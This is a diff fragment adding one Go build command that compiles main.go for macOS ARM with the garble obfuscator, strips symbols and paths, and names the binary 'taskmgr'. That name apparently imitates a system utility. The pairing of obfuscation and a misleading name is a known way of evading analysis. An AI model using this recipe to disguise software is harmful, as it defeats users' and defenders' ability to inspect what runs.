+GOOS=darwin GOARCH=arm64 garble -tiny -seed=random build -ldflags="-w -s" -trimpath -o taskmgr_darwin_arm64 main.go
+```
